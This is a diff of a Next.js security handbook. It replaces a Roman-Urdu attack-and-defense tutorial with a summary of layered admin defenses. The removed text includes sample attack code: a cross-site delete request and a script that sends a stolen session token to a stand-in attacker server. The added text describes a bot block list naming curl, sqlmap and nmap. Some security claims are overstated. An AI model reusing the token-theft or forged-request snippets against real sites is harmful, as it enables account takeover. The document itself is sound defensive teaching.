@@ -1,581 +1,199 @@
-# 🛡️ Zero to Hero: The Ultimate Web Security Mastery Handbook
-### *Next.js, Full-Stack Architecture, Database Defense & Real-World Cyber Attacks*
-**Author:** Mr Saqib Visuals & Engineering Security Team  
-**Last Updated:** September 2026  
-**Target Environment:** Production Next.js, Supabase, Vercel Edge Network  
+# Web Security Mastery Handbook
+*Advanced Defense-in-Depth Architecture for Next.js Applications*
+
+This document outlines the comprehensive security architecture, custom defense layers, and foundational web security protocols implemented in the `mrsaqib242` system. It is designed as a reference for understanding how military-grade and enterprise-level security concepts are applied practically in a modern web stack.
 
 ---
 
-## 📑 Table of Contents
-1. [Introduction: Security Ka Falsafa (The Philosophy of Cyber Security)](#1-introduction)
-2. [Security Architecture Overview (High-Level Diagram)](#2-architecture-overview)
-3. [Module 1: CSRF & Origin Validation (Cross-Site Request Forgery)](#module-1-csrf--origin-validation)
-4. [Module 2: Session Hijacking & Cookie Theft (HttpOnly, Secure, SameSite)](#module-2-session-hijacking--cookie-theft)
-5. [Module 3: Brute Force Attacks & Credential Stuffing (IP Rate Limiting & Account Lockout)](#module-3-brute-force--credential-stuffing)
-6. [Module 4: Timing Attacks on Cryptography (Constant-Time Verification)](#module-4-timing-attacks-on-cryptography)
-7. [Module 5: Password Cracking & Rainbow Tables (PBKDF2 100,000 Rounds + Salting)](#module-5-password-cracking--rainbow-tables)
-8. [Module 6: Direct Client-Side Database Tampering (Moving Writes to Authenticated Server APIs)](#module-6-direct-client-database-tampering)
-9. [Module 7: Clickjacking & UI Redressing (X-Frame-Options & CSP Frame Ancestors)](#module-7-clickjacking--ui-redressing)
-10. [Module 8: MIME Type Sniffing & Drive-By Executions (X-Content-Type-Options)](#module-8-mime-type-sniffing)
-11. [Module 9: SSL Stripping & Man-In-The-Middle (MitM) Attacks (HSTS Preload)](#module-9-ssl-stripping--mitm-attacks)
-12. [Module 10: Cross-Site Scripting (XSS) & Content Security Policy (CSP)](#module-10-cross-site-scripting--csp)
-13. [Module 11: Automated Reconnaissance & Admin Discovery (robots.txt Defense)](#module-11-automated-reconnaissance)
-14. [Module 12: AI API Quota Drainage & Form Flooding (Sliding Window & Honeypot Trap)](#module-12-ai-quota-drainage--honeypot)
-15. [Module 13: Production Source Code Leaks (Source Maps Hardening)](#module-13-production-source-code-leaks)
-16. [Master Security Checklist & Verification Commands](#master-security-checklist)
+## Part 1: Custom Defense-in-Depth Architecture (The 8 Main Layers)
+
+The system employs a "Defense-in-Depth" strategy. This means if an attacker manages to compromise one layer of security, they are immediately confronted by the next.
+
+### 1. Edge-Level Terminal Tarpit (Bot Blocker)
+Before a malicious request even reaches the core application logic, it is intercepted by the Next.js `middleware.ts`. 
+* **How it works:** The middleware scans the incoming `User-Agent` headers. If it detects signatures of automated hacking tools, vulnerability scanners, or bots (such as `curl`, `sqlmap`, `nmap`, or `python` scripts), it drops the connection instantly.
+* **The Result:** Instead of rendering the website, the server returns a `403 Forbidden` status accompanied by an ASCII skull and a psychological "Tarpit" message. This prevents server overload and stops automated reconnaissance dead in its tracks.
+
+### 2. The Decoy Honeypot (Psychological Trap)
+Hackers almost always use automated directory brute-forcing to find admin panels (e.g., searching for `/admin`). Instead of hiding the portal, the system exposes a fake, highly-visible portal at `/admin`.
+* **How it works:** This page is designed to look like a legitimate, highly-secured login portal. It even contains fake HTML comments (e.g., `backup_user: SAQIB_ROOT_ADMIN`) specifically to bait attackers who inspect the source code.
+* **The Result:** When the attacker submits the form thinking they have found a backdoor, the system logs their IP Address, Geolocation, and Device Info into the Intrusion Database, and redirects them to a "Shame Page."
+
+### 3. 24-Hour Auto-Ban System (Punitive Layer)
+To prevent brute-force attacks on the real login portal and penalize attackers caught in the Honeypot, a strict, database-backed rate limiter is enforced.
+* **How it works:** The system actively tracks malicious actions. If an IP address accumulates 5 strikes (e.g., 5 hits on the Honeypot or 5 failed Matrix OTP attempts) within a 2-hour window, it is automatically blacklisted in the `admin_banned_ips` table.
+* **The Result:** The middleware and API routes will completely block the attacker's IP for 24 hours. They will only see a 'Banned' error page, neutralizing their ability to interact with the system further.
+
+### 4. PBKDF2 Cryptography (Password Encryption)
+The Master PIN is never stored in plain-text format. If the database were ever leaked, the passwords would remain mathematically unreadable.
+* **How it works:** The system utilizes **PBKDF2** (Password-Based Key Derivation Function 2). This military-grade algorithm mixes the password with a unique cryptographic 'Salt' and loops over the hashing process 50,000 times (iterations). 
+* **The Result:** Even if a hacker uses a super-computer to brute-force the hash, the deliberate mathematical delay of 50,000 iterations makes it computationally unfeasible to crack.
+
+### 5. Out-of-Band (Air-Gapped) Matrix OTP
+Standard 2FA (Two-Factor Authentication) apps running on the same compromised PC can easily be bypassed by malware.
+* **How it works:** This system features a custom, isolated OTP generator (`/mradmin2`). This generator is designed to be used on a completely separate, "Air-Gapped" device (like the admin's mobile phone). 
+* **The Result:** The generator does not share or rely on the PC's session cookies. If a hacker has compromised the admin's PC with a Remote Access Trojan (RAT), they still cannot generate the OTP because the generator environment is physically and logically separated from the PC session.
+
+### 6. The True Port (Knowledge-Based Matrix)
+Even if an attacker manages to intercept or steal the dynamically generated 4-digit OTP, the system remains locked.
+* **How it works:** The login interface presents a visual matrix of 12 distinct "Ports". The admin must inject the OTP into the correct "True Port" (e.g., Port 8). This port number is a mental secret—it is nowhere on the login screen.
+* **The Result:** Injecting the correct OTP into any of the 11 decoy ports immediately invalidates the code, triggers a System Freeze (Shame Page), and registers a strike against the attacker. This is known as advanced Knowledge-Based Authentication (KBA).
+
+### 7. Device Fingerprinting & 48-Hour Restriction
+If a highly sophisticated attacker compromises the Master PIN and the True Port, they are stopped by hardware-level validation.
+* **How it works:** Upon every login, the system creates a unique 'Fingerprint' of the device. If the login occurs on an unrecognized or new device, the account is immediately placed into a **48-Hour Restricted Mode**.
+* **The Result:** The attacker can view the dashboard but is cryptographically locked out of performing sensitive actions (such as changing the Master Password, unbanning IPs, or altering security configurations) until the device is explicitly approved using an Emergency Recovery Key.
+
+### 8. HMAC Session Binding (Anti-Hijacking)
+A common attack vector is "Session Hijacking," where malware steals the victim's session cookie and the hacker imports it into their own browser to bypass login entirely.
+* **How it works:** All session cookies (`ms_admin_token`) in this system are digitally signed using **HMAC-SHA256** (Hash-based Message Authentication Code). Crucially, the cryptographic signature binds the cookie directly to the specific Device ID that generated it.
+* **The Result:** If a hacker steals the cookie and uses it on their PC, the server recalculates the hash. It immediately detects that the cookie is valid but the Device ID has changed. The server instantly rejects the cookie, destroying the hijacked session.
 
 ---
 
-## 1. Introduction: Security Ka Falsafa
-Web development mein aksar beginners sirf is baat par focus karte hain ke *"Website kaam kar rahi hai ya nahi"*. Lekin ek **Senior Full-Stack Architect** hamesha is angle se sochta hai:
-> *"Agar koi bad-niyat shakhs (Attacker/Hacker) mere system par aam user ki tarah nahi balke Burp Suite, Python scripts, automated bots aur malicious payloads ke sath hamla kare, toh meri application ka kya banega?"*
+## Part 2: Extra Custom Defenses (Built from Scratch)
 
-Web Security koi ek single plugin ya setting nahi hai. Isay **"Defense in Depth" (Layers of Security)** kaha jata hai. Agar hacker pehli deewar torh bhi le, toh doosri deewar usay rokay, aur doosri tootay toh teesri usay qaid kar le.
+Beyond the main 8 layers, we engineered specific micro-defenses tailored to counter advanced threats.
 
----
+### 9. Zero-Knowledge API Architecture (Blind Responses)
+APIs usually return `401 Unauthorized` when a password is wrong. Our `/generate` API never does this.
+* **How it works:** Whether the attacker enters the correct Master PIN or a wrong one, the API always returns a `200 OK` with a generated 4-digit code and colors.
+* **The Result:** The attacker has zero feedback. They don't know if the PIN they guessed was right or wrong until they actually try to use the OTP on the login screen, severely complicating brute-force attempts.
 
-## 2. Security Architecture Overview
+### 10. Intrusion Detection System (IDS) & Geo-Logging
+The system features a bespoke backend logger (`log-hack.ts`) that operates invisibly.
+* **How it works:** Whenever a trap is triggered, the API silently captures the attacker's IP, precise Geolocation (City/Country), ISP, and User-Agent, saving it directly to Supabase (`admin_hack_attempts`).
+* **The Result:** The admin receives a real-time "Intrusion Logs" dashboard, revealing exactly who is attacking, from where, and using what tools.
 
-Neeche diye gaye diagram ko ghaur se samjhein ke request internet se aane ke baad kin kin security filters se guzarti hai:
+### 11. Honeypot Anti-Spam (In-Memory Tarpit)
+A smart hacker might realize they are being logged and attempt to flood the Database (DDoS) by hitting the Honeypot 10,000 times a second.
+* **How it works:** A strict in-memory `Map` rate limiter is placed specifically on the logging API. It permits a maximum of 5 logging requests per IP per minute.
+* **The Result:** The database remains perfectly safe from exhaustion or spam. The attacker's script is met with instantaneous `429 Too Many Requests` errors without touching the database.
 
-```
-[ 🌐 Internet / User / Attacker ]
-               │
-               ▼
-┌────────────────────────────────────────────────────────┐
-│ 🛡️ LAYER 1: Browser & Edge Headers (next.config.mjs)   │
-│ • HSTS (Force HTTPS)                                   │
-│ • X-Frame-Options: DENY (Anti-Clickjacking)            │
-│ • X-Content-Type-Options: nosniff                      │
-│ • Content-Security-Policy (CSP Script & Media Lockdown)│
-│ • Referrer-Policy: strict-origin-when-cross-origin     │
-└────────────────────────────────────────────────────────┘
-               │
-               ▼
-┌────────────────────────────────────────────────────────┐
-│ 🛡️ LAYER 2: Request Inspection & Rate Limiting         │
-│ • IP-based Sliding Window Shield (Max req/min)         │
-│ • Honeypot Trap (Automated Bot neutralizer)            │
-│ • Payload Size Restrictions (Max JSON length)          │
-└────────────────────────────────────────────────────────┘
-               │
-               ▼
-┌────────────────────────────────────────────────────────┐
-│ 🛡️ LAYER 3: Origin & CSRF Defense                      │
-│ • validateRequestOrigin(req)                           │
-│ • Block requests from evil-hacker.com                  │
-└────────────────────────────────────────────────────────┘
-               │
-               ▼
-┌────────────────────────────────────────────────────────┐
-│ 🛡️ LAYER 4: Session & Cryptographic Token Auth         │
-│ • extractSessionToken() (Cookie / Bearer Header)       │
-│ • PBKDF2 & HMAC Signature Verification                 │
-│ • Timing-Safe Comparison (Anti-Side-Channel)           │
-└────────────────────────────────────────────────────────┘
-               │
-               ▼
-┌────────────────────────────────────────────────────────┐
-│ 🛡️ LAYER 5: Isolated Server-Side Database Execution    │
-│ • supabaseAdmin (Service Role Key isolated on server)  │
-│ • Parameterized Queries (Anti-SQL Injection)           │
-│ • Sanitized Data Mutation                              │
-└────────────────────────────────────────────────────────┘
-```
+### 12. Visual Misdirection (Color Matrix)
+The OTP generator doesn't just return a code; it returns a sequence of colors.
+* **How it works:** If the PIN is correct, it returns the true configuration colors. If wrong, it generates completely random hex colors.
+* **The Result:** This acts as a visual verification for the real admin (knowing their configured colors) and confuses shoulder-surfers or screen-recording malware by constantly changing visual patterns.
+
+### 13. Emergency Cryptographic Recovery Keys
+If the admin loses their primary trusted device, they are not permanently locked out by the 48-hour restriction.
+* **How it works:** The system allows generating one-time, 16-character cryptographic recovery keys (`emergency_recovery_codes`). These keys are heavily hashed using PBKDF2 just like passwords.
+* **The Result:** The admin can instantly bypass the 48-hour restriction on a new device by consuming a valid recovery code, ensuring absolute availability without compromising security.
 
 ---
 
-## Module 1: CSRF & Origin Validation
-### (Cross-Site Request Forgery)
+## Part 3: Foundational Web Security (Under the Hood)
 
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Cross-Site Request Forgery (CSRF)  
-**OWASP Category:** Broken Access Control / Insecure Direct Object References
+Beyond custom logic, the system rigidly enforces modern web security standards.
 
-### 2. Hacker Kya Sochta Hai & Attack Kaise Karta Hai?
-Maan lijiye aap apne Admin Dashboard par logged in hain. Aapka session cookie browser mein active hai.
-Hacker aapko ek email ya WhatsApp par link bhejta hai:
-`"Check out this cool developer tool: https://free-tools-gift.com"`
+### 1. HttpOnly & Secure Cookies
+- **`HttpOnly`**: All authentication cookies are flagged as `HttpOnly`. This prevents the browser's JavaScript engine (and any potential XSS payloads) from reading or stealing the cookie.
+- **`Secure`**: Enforces that cookies are only transmitted over an encrypted HTTPS connection, preventing Man-in-the-Middle (MitM) packet sniffing on insecure networks (like public Wi-Fi).
 
-Aap us link par click karte hain. Us website ke code ke andar chupkay se ek background JavaScript script chalta hai:
-```javascript
-// Hacker ki website ka code (evil.com):
-fetch('https://mrsaqib242.vercel.app/api/admin/projects', {
-  method: 'DELETE',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ id: 'project_1' })
-});
-```
-Kyunke aapka browser `mrsaqib242.vercel.app` ko jaanta hai aur cookies sath bhej sakta hai, bina CSRF defense ke yeh request execute ho jaati aur aapka project **delete** ho jata!
+### 2. SameSite=Strict (Anti-CSRF)
+Cookies are flagged with `SameSite=Strict`. This guarantees the browser will not send the session cookie if a request originates from an external domain, effectively neutralizing Cross-Site Request Forgery (CSRF) attacks (e.g., clicking a malicious link in an email).
 
-### 3. Agar Security Na Hoti Toh Kya Nuqsan Hota?
-Hacker aapke admin credentials jaane baghair sirf aapko ek link par click karwa kar aapka poora portfolio delete kar sakta tha ya apna ganda data inject kar sakta tha.
+### 3. Anti-XSS (Cross-Site Scripting Protection)
+Leveraging the native defenses of React and Next.js, all user inputs and variables rendered in the DOM are automatically escaped. Malicious scripts (e.g., `<script>steal()</script>`) injected into contact forms or inputs are treated as literal strings, neutralizing XSS vectors.
 
-### 4. Humne Code Mein Kaise Save Kiya?
-Hamare project mein [src/lib/serverAdminAuth.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/serverAdminAuth.ts) ke andar `validateRequestOrigin` function banaya gaya:
+### 4. Timing Attack Mitigation (`crypto.timingSafeEqual`)
+When the server compares the user's password hash against the database hash, it uses a constant-time comparison function (`timingSafeEqual`). Standard string comparison (`===`) stops as soon as it finds a mismatched character, allowing attackers to measure response times in milliseconds to guess the password character by character. Constant-time comparison takes the exact same amount of time regardless of whether the password is correct or completely wrong.
 
-```typescript
-export function validateRequestOrigin(req: NextApiRequest): boolean {
-  const origin = req.headers['origin'] || '';
-  const referer = req.headers['referer'] || '';
-  
-  // Local development + Live Production Domains
-  const allowed = [
-    'https://mrsaqib242.vercel.app',
-    'http://localhost:3000',
-    'http://127.0.0.1:3000'
-  ];
+### 5. Artificial Delay (API Tarpitting)
+To thwart high-speed automated brute-forcing, sensitive endpoints (like the OTP generator) introduce an artificial, randomized sleep delay (`await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000))`). This drastically reduces the number of guesses an automated bot can make per second.
 
-  // Agar request kisi aur domain (e.g. evil-hacker.com) se aayi ho:
-  if (origin && !allowed.some(domain => origin.startsWith(domain))) {
-    return false; // INSTANT BLOCK!
-  }
-  return true;
-}
-```
+### 6. Strict Origin Validation
+Backend API routes explicitly validate the `Origin` header. Requests made via automated tools like Postman, cURL, or malicious third-party scripts that attempt to bypass standard CORS policies are actively rejected by the backend if they do not originate from the legitimate `mrsaqib242.vercel.app` domain.
 
-Aur har admin API endpoint ([src/pages/api/admin/projects.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/projects.ts)) mein line 9 par check lagaya:
-```typescript
-if (req.method !== 'GET' && !validateRequestOrigin(req)) {
-  return res.status(403).json({ error: 'Forbidden: Request origin invalid.' });
-}
-```
+### 7. Supabase Row Level Security (RLS)
+The database operates on a zero-trust model. Even if the Next.js application layer is bypassed, direct interactions with the Supabase database via the anonymous API key are blocked by Row Level Security (RLS) policies. Only server-side functions using the secure Service Role Key can bypass these restrictions to manage admin data.
 
-### 5. Proof / Verification:
-Jab hacker ki domain se request aati hai, server seedha **`403 Forbidden`** phenk kar request ko kachre mein daal deta hai:
-```bash
-curl -i -X POST https://mrsaqib242.vercel.app/api/admin/projects -H "Origin: https://evil.com"
-# Result: HTTP/1.1 403 Forbidden {"error":"Forbidden: Request origin invalid."}
-```
+### 8. Edge-Level DDoS Protection (Vercel)
+Hosted on Vercel's Edge Network, the application benefits from enterprise-grade DDoS (Distributed Denial of Service) protection. Malicious volumetric traffic is absorbed and filtered globally at the network edge before it ever reaches the underlying application code or database.
+
+---
+*Generated for Architectural Review & Security Auditing.*
 
 ---
 
-## Module 2: Session Hijacking & Cookie Theft
-### (HttpOnly, Secure, SameSite=Strict)
+## Part 4: Easy Explanation (Roman Urdu / Hindi)
+*For presentations, quick reference, and explaining to non-technical peers.*
 
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Session Hijacking via XSS / Man-In-The-Middle Cookie Theft
+### 🛡️ Layer 1: Edge-Level Terminal Tarpit (Bot Blocker)
+Jab bhi koi hacker website par attack karta hai, wo hamesha automated tools (jaise `curl`, `sqlmap`, ya `python` scripts) use karta hai taake website ki kamzoriyan (vulnerabilities) dhoondh sake.
+* **Details:** Humari Next.js `middleware.ts` har aane wali request ka `User-Agent` check karti hai. Agar usay pata chale ke request kisi browser (Chrome/Safari) ke bajaye kisi hacking tool se aayi hai, toh wo server tak baat pohnchne hi nahi deti. Hawa mein hi usay `403 Forbidden` ka thappar marti hai aur ek ASCII Skull 💀 (Tarpit) bhej deti hai. Is se aapka server overload hone se bach jata hai.
 
-### 2. Hacker Kaise Attack Karta Hai?
-Agar authentication token `localStorage` mein store ho, ya cookie aam (non-HttpOnly) ho:
-Hacker website ke kisi bhi script, third-party library ya widget ke zariye console mein run karta hai:
-```javascript
-const stolenToken = localStorage.getItem('admin_token');
-// ya
-const stolenCookie = document.cookie;
-fetch('https://hacker-c2-server.com/log?token=' + stolenToken);
-```
-Token chori hotay hi hacker apne browser mein wo token paste karta hai aur bina password ke aapka admin ban jata hai!
+### 🪤 Layer 2: The Decoy Honeypot (Psychological Trap)
+Hackers hamesha kisi website ka admin panel dhoondhte hain (maslan `/admin`). Humne isay chupane ke bajaye jaan boojh kar `/admin` par ek fake login page bana diya hai.
+* **Details:** Is page par humne HTML code ke andar fake comments chhoray hue hain (jaise: `backup_user: SAQIB_ROOT_ADMIN`). Hacker samajhta hai usne website hack kar li. Jaise hi wo form submit karta hai, humara system usey access dene ke bajaye uski IP Address, Location, aur Device info record kar ke Intrusion Logs mein daal deta hai aur usay "Shame Page" par bhej deta hai.
 
-### 3. Humne Code Mein Kaise Save Kiya?
-Humne tokens ko `localStorage` se hata kar **Encrypted HttpOnly Server Cookies** mein convert kiya:
+### 🚫 Layer 3: 24-Hour Auto-Ban System (Punitive Layer)
+Honeypot aur login pages par koi baar baar ghalat password daal kar brute-force attack kar sakta hai.
+* **Details:** Humara system har ghalat attempt ko count karta hai. Agar kisi IP address se 2 ghante ke andar 5 dafa Honeypot hit ho, ya Matrix OTP ghalat dala jaye, toh system automatically us IP ko Database ki `admin_banned_ips` list mein daal deta hai. Agle 24 ghante tak wo IP website ka koi bhi admin page nahi khol sakti, usay sirf ek 'Banned' error nazar ayega.
 
-```typescript
-// src/lib/serverAdminAuth.ts
-export function setAdminSessionCookie(res: NextApiResponse, token: string): void {
-  const cookieValue = [
-    `saqib_admin_session=${encodeURIComponent(token)}`,
-    'Path=/',
-    'HttpOnly',              // 🛡️ JavaScript cannot read this cookie (No XSS theft!)
-    'Secure',                // 🛡️ Only sent over HTTPS
-    'SameSite=Strict',       // 🛡️ Never sent on cross-site requests (Anti-CSRF)
-    `Max-Age=${7 * 24 * 3600}` // 7 days expiry
-  ].join('; ');
+### 🔐 Layer 4: PBKDF2 Cryptography (Password Encryption)
+Aapka "Master PIN" database mein text (maslan '1234') ki form mein nahi rakha gaya, kyunke agar database hack ho jaye toh sab samne aa jayega.
+* **Details:** Humne PBKDF2 (Password-Based Key Derivation Function 2) use kiya hai. Yeh military-grade algorithm aapke password ko ek khufiya 'Salt' ke sath mix kar ke us par 50,000 dafa (iterations) loop chalata hai aur ek lamba hash banata hai. Agar dunya ka sab se tez super-computer bhi ise decrypt karne ki koshish kare, toh usay saikron saal lag jayenge.
 
-  res.setHeader('Set-Cookie', cookieValue);
-}
-```
+### 📱 Layer 5: Out-of-Band (Air-Gapped) Matrix OTP
+Aam 2FA (jaise Google Authenticator) agar usi PC par khula ho jahan login karna hai, toh PC hack hone par 2FA bhi chori ho jata hai.
+* **Details:** Aapka OTP generator (`/mradmin2`) bilkul alag hai. Ise aap apne mobile par use karte hain. Yeh Generator PC ke session cookies ko nahi janta aur na hi unse connect hota hai. Agar PC par koi hacker baitha bhi hai, toh wo OTP generate nahi kar sakta kyunke generator bilkul ek 'Air-Gapped' (alag thalag) environment mein chal raha hai.
 
-### 4. Hacker Kyun Haar Gaya?
-- **`HttpOnly`:** Browser ka JavaScript engine `document.cookie` se is cookie ko parhne se inkaar kar deta hai. Agar hacker XSS attack chala bhi le, tab bhi token chori nahi ho sakta!
-- **`SameSite=Strict`:** Jab tak user direct aapki website ke andar na ho, browser doosri websites ke click par cookie bhejta hi nahi hai!
+### 🧠 Layer 6: The True Port (Knowledge-Based Matrix)
+OTP milne ke baad bhi system asani se unlock nahi hota. Login page par aapko 12 boxes (Ports) nazar aate hain.
+* **Details:** Hacker ko agar aapka OTP mil bhi jaye, usay yeh nahi pata ke in 12 mein se kis box mein code type karna hai! Kyunke "True Port" (jaise Port 8) database mein save ek khufiya number hai jo sirf aapke dimaagh mein hai. Ghalat port par code dalne se OTP zaya ho jata hai aur Strike lag jati hai. Ise 'Knowledge-Based Authentication' kehte hain.
+
+### 💻 Layer 7: Device Fingerprinting & 48-Hour Restriction
+Agar hacker ko aapka PIN aur True Port dono mil jayen, phir bhi wo aapka system control nahi kar sakta.
+* **Details:** Jaise hi koi naye PC ya Mobile se login hota hai, system us device ka 'Fingerprint' (ID) banata hai aur check karta hai ke kya Saqib ne isay Trust kiya hua hai? Agar nahi, toh account 48-Hour Restricted Mode mein chala jata hai. Hacker andar aa kar bhi password change karna, kisi ko unban karna, ya security settings chherne jaise kaam nahi kar sakta jab tak Master Password dubara na dala jaye.
+
+### 🔏 Layer 8: HMAC Session Binding
+Aam websites par login hone ke baad ek Cookie banti hai. Hackers aksar virus ke zariye wo Cookie chura kar apne PC mein daal lete hain aur bina password ke login ho jate hain (Ise Session Hijacking kehte hain).
+* **Details:** Aapki Cookie par HMAC-SHA256 (Hash-based Message Authentication Code) ka digital signature laga hua hai. Us signature ke andar aapki 'Device ID' bind (mix) hui wi hai. Agar hacker cookie chura kar apne PC mein dalta hai, toh Server dekhta hai ke "Cookie theek hai, lekin PC badal gaya hai, iska matlab kisi ne chori ki hai!" aur fauran us cookie ko reject kar deta hai.
 
 ---
 
-## Module 3: Brute Force & Credential Stuffing
-### (IP Rate Limiting & Account Lockout Shield)
+### 🛡️ Mazeed Custom Layers (Jo Humne Khud Scratch Se Banayin)
 
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Automated Dictionary Attack & Credential Stuffing
+**9. Zero-Knowledge API (Blind Response)**
+Aam APIs password ghalat hone par error deti hain. Humara OTP generator hacker ko andaza hi nahi hone deta. Password theek ho ya ghalat, API hamesha 'Success' aur fake colors/codes bhejti hai. Hacker ko login page par ja kar hi pata chalta hai ke usne guess theek kiya tha ya nahi, jis se Brute-force attack takreeban na-mumkin ho jata hai.
 
-### 2. Hacker Kaise Attack Karta Hai?
-Hacker ek automation tool (jaise Python script ya Burp Suite Intruder) kholta hai aur 10,000 common passwords ki list run kar deta hai:
-- `admin / 123456`
-- `saqib / password123`
-- `saqib / saqib2024`
-- Har second mein 50 requests aati hain. Agar rate limiting na ho toh kuch ghanton mein password guess ho jata hai.
+**10. Intrusion Detection System (IDS & Geo-Logging)**
+Honeypot par aane wale har attacker ko system chup-chaap track karta hai. Uski IP, Location, Internet Provider (ISP), aur Browser/Device (User-Agent) ki details pakar kar `admin_hack_attempts` database mein save kar leta hai taake admin baad mein dekh sake ke attack kahan se ho raha hai.
 
-### 3. Humne Code Mein Kaise Save Kiya?
-[src/lib/serverAdminAuth.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/serverAdminAuth.ts) ke andar brute-force lockout engine banaya:
+**11. Honeypot Anti-Spam (Memory Tarpit)**
+Agar kisi hacker ko pata chal jaye ke uski IP log ho rahi hai, toh wo 1 second mein 10,000 requests bhej kar aapka database full (crash) karne ki koshish kar sakta hai. Is se bachne ke liye humne Memory mein ek limit lagayi hai (Max 5 request per minute). Is limit ke baad request database tak jati hi nahi, wahin hawa mein block ho jati hai.
 
-```typescript
-interface LoginAttemptRecord {
-  attempts: number;
-  lockedUntil: number;
-}
-const loginAttemptsMap = new Map<string, LoginAttemptRecord>();
+**12. Visual Misdirection (Color Matrix)**
+OTP generator sirf code nahi bhejta, balke rang (colors) bhi bhejta hai. Asli admin ko apne colors pata hote hain. Agar hacker aapki screen record kar raha hai ya aapke peechay khara hai, toh random colors aur fake codes usay confuse kar dete hain.
 
-// Har request par IP check hoti hai:
-const record = loginAttemptsMap.get(clientIp);
-if (record && record.lockedUntil > Date.now()) {
-  const secondsLeft = Math.ceil((record.lockedUntil - Date.now()) / 1000);
-  return { 
-    success: false, 
-    locked: true, 
-    remainingLockSeconds: secondsLeft, 
-    message: `Account temporarily locked due to multiple failed logins. Try again in ${secondsLeft}s.` 
-  };
-}
-
-// Agar 5 martaba ghalat password daala:
-if (record.attempts >= 5) {
-  record.lockedUntil = Date.now() + 15 * 60 * 1000; // 15 MINUTES COMPLETE LOCKOUT!
-}
-```
-
-### 4. Hacker Kyun Haar Gaya?
-5 ghalat attempts ke baad hacker ka IP address **15 minute ke liye ban** ho jata hai aur server **HTTP 429 Too Many Requests** return karta hai. Ek dictionary attack jo 1 ghante mein hona tha ab usay 20 saal lag jayenge!
+**13. Emergency Recovery Keys**
+Agar aapka asal PC toot jaye ya ghum ho jaye, toh aap 48-Hour restriction mein phans jayenge. Iske liye humne 16-character lambay Recovery Codes banaye hain jo PBKDF2 se encrypted hain. Inko use kar ke aap emergency mein apna system wapas hasil kar sakte hain.
 
 ---
 
-## Module 4: Timing Attacks on Cryptography
-### (Constant-Time Verification via timingSafeEqual)
+### ⚙️ Under-The-Hood & Default Security (Internal Web Standards)
 
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Side-Channel Timing Attack (Nanosecond Measurement)
+**1. HttpOnly (Anti-Cookie Theft)**
+Aapki login cookie par 'HttpOnly' ka lock hai. Iska matlab hai browser ki koi bhi JavaScript us cookie ko parh nahi sakti. Agar hacker kisi tarah apna code chala bhi le, wo aapka login session chura nahi sakta.
 
-### 2. Hacker Kya Karta Hai?
-Aam JavaScript code mein do strings ko aise compare kiya jata hai:
-```javascript
-if (userProvidedToken === actualServerToken) // ❌ DANGEROUS!
-```
-Normal string comparison pehle character se shuru hoti hai. Jaise hi pehla character mismatch hota hai, JavaScript execution stop kar deta hai:
-- Agar pehla character ghalat ho: Time laga `0.001 ms`
-- Agar pehla sahi ho lekin doosra ghalat: Time laga `0.002 ms`
-- Agar 10 characters sahi hon: Time laga `0.010 ms`
-Hacker server ke response time ko high-precision timer se nap kar character-by-character token guess kar leta hai!
+**2. Secure Flag & HTTPS (Anti-Wi-Fi Hack)**
+Cookie sirf aur sirf encrypted (HTTPS) lines par travel karti hai. Agar aap kisi public Wi-Fi (jaise airport) par hain, toh koi network hacker aapka data ya password chura nahi sakta kyunke sab kuch scrambled (kachra) form mein jata hai.
 
-### 3. Humne Code Mein Kaise Save Kiya?
-Humne Node.js ke cryptographic hardware-level `crypto.timingSafeEqual` function ka istemal kiya:
+**3. SameSite=Strict (Anti-CSRF)**
+Agar hacker WhatsApp par aapko fake link bheje, toh SameSite ki wajah se browser us link ke sath aapki Cookie nahi bhejega. Is se Cross-Site Request Forgery (CSRF) attack bilkul fail ho jata hai.
 
-```typescript
-// src/lib/serverAdminAuth.ts
-import crypto from 'crypto';
+**4. Anti-XSS (Cross-Site Scripting Protection)**
+React aur Next.js khud ba khud input box mein dale gaye khatarnaak `<script>` tags ko sirf ek 'Text' mein badal dete hain, usay execute (run) nahi hone dete.
 
-export function constantTimeCompare(a: string, b: string): boolean {
-  const bufA = Buffer.from(a, 'utf8');
-  const bufB = Buffer.from(b, 'utf8');
+**5. Timing Attack Mitigation**
+Backend par humne `crypto.timingSafeEqual` use kiya hai. Password theek ho ya ghalat, server ka response time bilkul same rehta hai, taake hacker mili-seconds (time) measure kar ke password ka andaza na laga sake.
 
-  // Length match nahi toh safe exit
-  if (bufA.length !== bufB.length) return false;
+**6. Artificial Delay (Bot Speed Breaker)**
+Bots ki speed todne ke liye OTP API jaan boojh kar 1 se 1.5 second ka delay (rukawat) dalti hai. Is choti si rukawat ki wajah se automated hacking ka time saloon (years) tak barh jata hai.
 
-  // Har character ko barabar waqt mein check karta hai (Constant Time O(1))
-  return crypto.timingSafeEqual(bufA, bufB);
-}
-```
+**7. Supabase RLS (Row Level Security)**
+Yeh aapke database ka apna 'Andar wala Bodyguard' hai. Agar koi hacker frontend bypass kar ke direct Database se data nikalne ki koshish kare, toh RLS policy usay fauran block kar deti hai kyunke uske paas Service Role (Master Key) nahi hoti.
 
-### 4. Hacker Kyun Haar Gaya?
-Chahe token ka pehla harf ghalat ho ya aakhri, function har bar theek utna hi time leta hai. Hacker ke paas response time se token guess karne ka 0% chance bachta hai!
-
----
-
-## Module 5: Password Cracking & Rainbow Tables
-### (PBKDF2 with 100,000 Rounds + Cryptographic Salt)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Offline Rainbow Table Lookup & GPU Hash Cracking
-
-### 2. Hacker Kya Karta Hai?
-Agar database leak ho jaye aur passwords plain text ya aam MD5/SHA256 mein hon:
-- `MD5("saqib242") = "8e0259b660f897b..."`
-Hacker pre-computed tables (Rainbow Tables) mein search karta hai aur 1 second mein password dhoondh leta hai.
-
-### 3. Humne Code Mein Kaise Save Kiya?
-Humne **PBKDF2 (Password-Based Key Derivation Function 2)** lagaya:
-1. **Unique Salt:** Har hash ke sath ek random cryptographic salt judti hai.
-2. **100,000 Iterations:** Hash ko 100,000 martaba mathematical loop se guzara jata hai.
-
-```typescript
-// src/lib/serverAdminAuth.ts
